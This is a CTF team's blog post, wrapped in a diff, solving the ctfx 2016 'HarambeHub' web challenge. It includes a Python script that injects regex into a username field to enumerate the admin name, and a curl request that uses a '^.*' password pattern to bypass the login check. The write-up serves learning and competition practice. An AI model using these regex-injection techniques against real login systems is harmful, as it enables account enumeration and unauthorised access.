@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  <title>ctfx [Web] - HarambeHub [100pts] | TeamRocketIST - Portuguese CTF Team</title>
+  <meta name="description" content="This site was created in honor of harambe: http://problems.ctfx.io:7003/Problem author: omegablitzHarambeHub.javaUser.java  Two java files are given, analyzing both we can see that on the first file t">
+<meta name="keywords" content="web,regex,java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfx [Web] - HarambeHub [100pts]">
+<meta property="og:url" content="https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/index.html">
+<meta property="og:site_name" content="TEAMROCKETIST">
+<meta property="og:description" content="This site was created in honor of harambe: http://problems.ctfx.io:7003/Problem author: omegablitzHarambeHub.javaUser.java  Two java files are given, analyzing both we can see that on the first file t">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-08-10T02:41:26.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ctfx [Web] - HarambeHub [100pts]">
+<meta name="twitter:description" content="This site was created in honor of harambe: http://problems.ctfx.io:7003/Problem author: omegablitzHarambeHub.javaUser.java  Two java files are given, analyzing both we can see that on the first file t">
+  
+    <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/avatar.png" type="image/x-icon">
+  
+  <!-- font-awesome CSS -->
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+
+<body class="main-center">
+  <section class="mainside">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
+          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse">
+      <ul class="nav navbar-nav main-nav">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="fa fa-fw fa-home"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="fa fa-fw fa-archive"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="fa fa-fw fa-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="fa fa-fw fa-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="fa fa-fw fa-code"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="fa fa-fw fa-gg"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="fa fa-fw fa-coffee"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      <div class="footer">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        
+    </ul>
+    
+    <div class="copyright">
+        &copy; 2017 TEAMROCKETIST
+        <div class="publishby">
+        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. -->
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</div>
+    </nav>
+  </div>
+</section>
+
+  
+    <section class="sidebar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            
+            <div class="content">
+                <p>PC MASTER RACE!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Forensics/">Forensics</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Network/">Network</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">7</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LTE/">LTE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/X-Forwarded-For/">X-Forwarded-For</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/base64/">base64</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bruteforce/">bruteforce</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/filterbypass/">filterbypass</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensics/">forensics</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/">gdb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hash/">hash</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/login/">login</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/">md5</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/noSql/">noSql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pcap/">pcap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/perl/">perl</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/png/">png</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/regex/">regex</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellshock/">shellshock</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/usb/">usb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xor/">xor</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/LTE/" style="font-size: 13px;">LTE</a> <a href="/tags/Misc/" style="font-size: 13px;">Misc</a> <a href="/tags/RSA/" style="font-size: 13px;">RSA</a> <a href="/tags/X-Forwarded-For/" style="font-size: 13px;">X-Forwarded-For</a> <a href="/tags/base64/" style="font-size: 13px;">base64</a> <a href="/tags/bruteforce/" style="font-size: 13.33px;">bruteforce</a> <a href="/tags/crypto/" style="font-size: 13.67px;">crypto</a> <a href="/tags/filterbypass/" style="font-size: 13px;">filterbypass</a> <a href="/tags/forensics/" style="font-size: 13px;">forensics</a> <a href="/tags/gdb/" style="font-size: 13px;">gdb</a> <a href="/tags/hash/" style="font-size: 13px;">hash</a> <a href="/tags/java/" style="font-size: 13px;">java</a> <a href="/tags/login/" style="font-size: 13px;">login</a> <a href="/tags/md5/" style="font-size: 13.33px;">md5</a> <a href="/tags/mongodb/" style="font-size: 13px;">mongodb</a> <a href="/tags/network/" style="font-size: 13px;">network</a> <a href="/tags/noSql/" style="font-size: 13px;">noSql</a> <a href="/tags/pcap/" style="font-size: 13px;">pcap</a> <a href="/tags/perl/" style="font-size: 13px;">perl</a> <a href="/tags/png/" style="font-size: 13px;">png</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/regex/" style="font-size: 13px;">regex</a> <a href="/tags/reverse/" style="font-size: 13.67px;">reverse</a> <a href="/tags/shellshock/" style="font-size: 13px;">shellshock</a> <a href="/tags/sql/" style="font-size: 13px;">sql</a> <a href="/tags/sqli/" style="font-size: 13px;">sqli</a> <a href="/tags/usb/" style="font-size: 13px;">usb</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/wireshark/" style="font-size: 13px;">wireshark</a> <a href="/tags/xor/" style="font-size: 13px;">xor</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Network/">Network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/07/Network-Sha2017-Abuse-Mail-300/" class="title">[Network] Sha2017 - Abuse Mail [300]</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-07T12:52:21.000Z" itemprop="datePublished">2017-08-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Web/">Web</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/" class="title">[Web] Bugs Bunny CTF - LQI_X 140</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-02T10:29:58.000Z" itemprop="datePublished">2017-08-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/01/Reverse-BugsBunny-CTF-Rev75/" class="title">[Reverse] BugsBunny CTF - Rev75</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-01T08:03:50.000Z" itemprop="datePublished">2017-08-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/" class="title">[Reverse] Bugs Bunny CTF - Rev100</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-07-31T15:14:17.000Z" itemprop="datePublished">2017-07-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/" class="title">[Reverse] - Bugs Bunny CTF - Rev 50</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-07-31T14:16:03.000Z" itemprop="datePublished">2017-07-31</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</section>
+
+  
+  <section class="main">
+  <div class="content">
+  <article id="post-ctfx-Web-HarambeHub-100pts" class="article article-type-post" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctfx [Web] - HarambeHub [100pts]
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="fa fa-calendar-check-o"></i>
+	<a href="/2016/08/29/ctfx-Web-HarambeHub-100pts/" class="article-date">
+	  <time datetime="2016-08-28T23:49:36.000Z" itemprop="datePublished">2016-08-29</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="fa fa-folder"></i>
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="fa fa-tag"></i>
+	<a class="article-tag-link" href="/tags/java/">java</a>, <a class="article-tag-link" href="/tags/regex/">regex</a>, <a class="article-tag-link" href="/tags/web/">web</a>
+  </span>
+
+
+        
+
+		
+		
+	
+		<span class="post-wordcount hidden-xs">Word Count: 365 (words)</span>
+	
+	
+		<span class="post-readcount hidden-xs">Read Time: 2 (min)</span>
+	
+
+      </div>
+    </header>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote><br>This site was created in honor of harambe: <a href="http://problems.ctfx.io:7003/" target="_blank" rel="external">http://problems.ctfx.io:7003/</a><br>Problem author: omegablitz<br><a href="http://compete.ctfx.io/download?file_key=0d7414507eb86f68d615a1b29777964b9f8abc8c4cce3f68364bc1a2b9ac3aae&team_key=396a50d69c10b7b12cab398e322320aff517fd16dc2b2ccfd71da1d6ee4e1b54" target="_blank" rel="external">HarambeHub.java</a><br><a href="http://compete.ctfx.io/download?file_key=79e8734839204206ba08ec90f9919002a19507592bafd5924d3d0ac0a07a5e04&team_key=396a50d69c10b7b12cab398e322320aff517fd16dc2b2ccfd71da1d6ee4e1b54" target="_blank" rel="external">User.java</a><br></blockquote>
+
+<p>Two java files are given, analyzing both we can see that on the first file there is an “if condition” that is using string.match for username to check if it exists, knowning this we can get the admin username character by character with a python script by regex injecting.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment">#for x in "abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":</span></div><div class="line">username = <span class="string">''</span></div><div class="line">lower_alpha = <span class="string">'[a-z]'</span></div><div class="line">upper_alpha = <span class="string">'[A-Z]'</span></div><div class="line">digits = <span class="string">'[0-9]'</span></div><div class="line">special = <span class="string">'[^\w]'</span></div><div class="line">regex_string = <span class="string">''</span></div><div class="line">d = &#123;lower_alpha : string.ascii_lowercase, upper_alpha : string.ascii_uppercase, digits: string.digits, special: string.punctuation + string.whitespace&#125;</div><div class="line">regex = [lower_alpha, upper_alpha, digits, special]</div><div class="line">char_found = <span class="keyword">True</span></div><div class="line">regex_found = <span class="keyword">True</span></div><div class="line"><span class="keyword">while</span> regex_found:</div><div class="line">    regex_found = <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> regex:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            a = requests.post(<span class="string">'http://problems.ctfx.io:7003/users'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'^%s.*'</span> % (regex_string+r), <span class="string">'password'</span>: <span class="string">'a'</span>, <span class="string">'realname'</span>: <span class="string">'a'</span>&#125;)</div><div class="line">            <span class="keyword">if</span> (a.status_code != <span class="number">200</span>):</div><div class="line">                <span class="comment">#print a.text, r</span></div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> (<span class="string">"FAILED: User with that name already exists!"</span> <span class="keyword">in</span> a.text):</div><div class="line">                regex_found = <span class="keyword">True</span></div><div class="line">                char_found = <span class="keyword">True</span></div><div class="line">                regex_string += r</div><div class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> d[r]:</div><div class="line">                    char_found = <span class="keyword">False</span></div><div class="line">                    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                        <span class="keyword">if</span> (x <span class="keyword">in</span> <span class="string">'\.[]&#123;&#125;()*+-?^$|'</span>):</div><div class="line">                            x = <span class="string">'\\'</span> + x</div><div class="line">                        a = requests.post(<span class="string">'http://problems.ctfx.io:7003/users'</span>, data=&#123;<span class="string">'username'</span>: <span class="string">'^(%s).*'</span> % (username+x), <span class="string">'password'</span>: <span class="string">'a'</span>, <span class="string">'realname'</span>: <span class="string">'a'</span>&#125;)</div><div class="line">                        <span class="keyword">if</span> (a.status_code != <span class="number">200</span>):</div><div class="line">                            <span class="comment">#print a.text, x</span></div><div class="line">                            <span class="keyword">continue</span></div><div class="line">                        <span class="comment"># print a.text, x</span></div><div class="line">                        <span class="keyword">if</span> (<span class="string">"FAILED: User with that name already exists!"</span> <span class="keyword">in</span> a.text):</div><div class="line">                            username += x</div><div class="line">                            char_found = <span class="keyword">True</span></div><div class="line">                            <span class="keyword">print</span> <span class="string">"The username: "</span> + username</div><div class="line">                        <span class="keyword">break</span></div><div class="line">                    <span class="keyword">if</span> char_found:</div><div class="line">                        <span class="keyword">break</span></div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/c/web2&gt; python a.py</div><div class="line">The username: \[</div><div class="line">The username: \[A</div><div class="line">The username: \[Ad</div><div class="line">The username: \[Adm</div><div class="line">The username: \[Admi</div><div class="line">The username: \[Admin</div><div class="line">The username: \[Admin\]</div><div class="line">The username: \[Admin\] </div><div class="line">The username: \[Admin\] A</div><div class="line">The username: \[Admin\] Ar</div><div class="line">The username: \[Admin\] Arx</div><div class="line">The username: \[Admin\] Arxe</div><div class="line">The username: \[Admin\] Arxen</div><div class="line">The username: \[Admin\] Arxeni</div><div class="line">The username: \[Admin\] Arxenix</div><div class="line">The username: \[Admin\] Arxenixi</div><div class="line">The username: \[Admin\] Arxenixis</div><div class="line">The username: \[Admin\] Arxenixisa</div><div class="line">The username: \[Admin\] Arxenixisal</div><div class="line">The username: \[Admin\] Arxenixisalo</div><div class="line">The username: \[Admin\] Arxenixisalos</div><div class="line">The username: \[Admin\] Arxenixisalose</div><div class="line">The username: \[Admin\] Arxenixisaloser</div></pre></td></tr></table></figure>
+<p>One the second one we can see that is doing same thing but now with the password, so now we have the admin username we can just inject this regex “^*.” on the password and get the flag :)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian /v/w/html&gt; curl <span class="string">'http://problems.ctfx.io:7003/name?username=\[Admin\]%20Arxenixisaloser&amp;password=^.*'</span></div><div class="line">ctf(h4r4mb3_d1dn1t_d13_4_th1s_f33ls_b4d)</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <blockquote>
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link">
+      <strong>Link to this article：</strong>
+      <a href="https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/" title="ctfx [Web] - HarambeHub [100pts]" target="_blank" rel="external">https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/</a>
+    </li>
+    
+    <!--li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li-->
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/teamrocketist" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/teamrocketist" target="_blank"><span class="text-dark">TeamRocketIST</span><small class="ml-1x">CTF Team</small></a></h3>
+        <div>Portuguese Computer Science Students</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </footer>
+  </article>
+  
+    
+  <div id="comments"></div>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2016/08/29/ctfx-Web-–-north-korea-100pts/" title="ctfx [Web] – north korea [100pts]"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2016/08/27/IceCTF-web-Geocities/" title="IceCTF [web] - Geocities">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+  </div>
+  
+</nav>
+
+</section>
+
+  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.js"></script>
+<script src="/js/application.js"></script>
+
+
+
+  <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+</body>
+</html>
